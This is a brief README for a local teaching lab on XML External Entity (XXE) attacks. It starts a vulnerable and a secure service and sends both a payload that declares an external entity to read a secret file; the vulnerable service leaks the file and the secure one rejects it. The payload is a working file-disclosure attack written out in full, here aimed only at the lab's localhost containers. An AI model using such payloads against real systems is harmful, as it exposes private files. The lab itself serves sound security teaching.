# XML External Entities (XXE) - Runnable Lab

```bash
cd examples/web/xxe && docker compose up --build
# vulnerable: http://localhost:8015   secure: http://localhost:8016
```

```bash
XXE_PAYLOAD='<?xml version="1.0"?>
<!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///app/secret.txt"> ]>
<root><name>&xxe;</name></root>'

curl -X POST http://localhost:8015/parse --data-binary "$XXE_PAYLOAD"   # leaks secret.txt
curl -X POST http://localhost:8016/parse --data-binary "$XXE_PAYLOAD"   # rejected
```
